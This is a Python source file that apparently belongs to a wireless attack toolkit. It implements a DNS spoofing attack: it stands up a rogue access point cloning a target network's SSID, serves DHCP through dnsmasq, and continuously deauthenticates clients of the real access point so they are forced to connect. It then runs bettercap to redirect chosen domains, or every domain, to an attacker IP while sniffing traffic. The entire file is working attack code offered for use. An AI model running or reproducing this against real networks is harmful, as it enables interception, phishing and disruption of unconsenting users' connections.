# attacks/dns_spoof.py

import subprocess
import time
import os
from typing import Optional
from termcolor import colored
from .base import BaseAttack
from utils.helpers import run_in_new_terminal

class DNSSpoofAttack(BaseAttack):
    """
    Performs DNS Spoofing using bettercap.
    Redirects specific domains to a target IP (e.g., your local web server).
    """

    def __init__(self, monitor_interface: str, target_bssid: str, target_ssid: str, target_channel: str):
        super().__init__(monitor_interface)
        self.target_bssid = target_bssid
        self.target_ssid = target_ssid
        self.target_channel = str(target_channel)
        self.ap_proc = None
        self.dnsmasq_proc = None
        self.deauth_proc = None

    def _execute(self):
        print(colored("\n" + "="*60, "blue", attrs=['bold']))
        print(colored("    🎯 DNS SPOOFING / TARGETED REDIRECTION 🎯", "blue", attrs=['bold']))
        print(colored("="*60, "blue", attrs=['bold']))

        try:
            # Step 1: Get Redirection Details
            fake_ip = input(colored("\n ➤ Enter IP to redirect users to (Default 10.0.0.1): ", "cyan")).strip() or "10.0.0.1"
            domains = input(colored(" ➤ Enter domains to spoof (comma separated, e.g., google.com, facebook.com): ", "cyan")).strip()
            
            if not domains:
                print(colored("[!] No domains specified. Spoofing all queries (*).", "yellow"))
                domains = "*"

            # Step 2: Enable Forwarding and Start AP
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
            
            print(colored("[*] Launching Rogue AP & DHCP...", "cyan"))
            ap_cmd = ["airbase-ng", "-e", self.target_ssid, "-c", self.target_channel, self.monitor_interface]
            self.ap_proc = subprocess.Popen(ap_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            time.sleep(5)
            subprocess.run(["ip", "link", "set", "at0", "up"], capture_output=True)
            subprocess.run(["ip", "addr", "add", "10.0.0.1/24", "dev", "at0"], capture_output=True)

            # DHCP Server ( dnsmasq logic from EvilTwin )
            subprocess.run(["pkill", "dnsmasq"], capture_output=True)
            dns_cmd = ["dnsmasq", "-i", "at0", "--dhcp-range=10.0.0.10,10.0.0.250,12h", "--dhcp-option=3,10.0.0.1", "-d"]
            self.dnsmasq_proc = subprocess.Popen(dns_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # Step 3: Start Background Deauth
            print(colored("[*] Starting deauth to force connections...", "red"))
            deauth_cmd = ["aireplay-ng", "--deauth", "0", "-a", self.target_bssid, self.monitor_interface]
            self.deauth_proc = subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # Step 4: Launch Bettercap DNS Spoofing
            print(colored("[*] Launching Bettercap DNS engine...", "cyan"))
            # bettercap command: dns.spoof.domains sets targets, dns.spoof.address sets redirection IP
            bettercap_eval = f"set dns.spoof.domains {domains}; set dns.spoof.address {fake_ip}; dns.spoof on; net.sniff on"
            bettercap_cmd = f"bettercap -iface at0 -eval '{bettercap_eval}'"
            run_in_new_terminal(bettercap_cmd)

            print(colored("\n" + "═"*60, "green", attrs=['bold']))
            print(colored("    ✓ DNS SPOOFING ACTIVE!", "green", attrs=['bold']))
            print(colored(f"    ✓ Redirecting {domains} ➜ {fake_ip}", "green"))
            print(colored("═"*60, "green", attrs=['bold']))
            
            while True:
                time.sleep(1)

        except KeyboardInterrupt:
            pass
        finally:
            self._cleanup()

    def _cleanup(self):
        print(colored("\n[*] Cleaning up DNS Spoof environment...", "cyan"))
        if self.ap_proc: self.ap_proc.terminate()
        if self.dnsmasq_proc: self.dnsmasq_proc.terminate()
        if self.deauth_proc: self.deauth_proc.terminate()
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
        subprocess.run(["pkill", "bettercap"], capture_output=True)
        subprocess.run(["pkill", "airbase-ng"], capture_output=True)
        subprocess.run(["pkill", "dnsmasq"], capture_output=True)
        subprocess.run(["pkill", "aireplay-ng"], capture_output=True)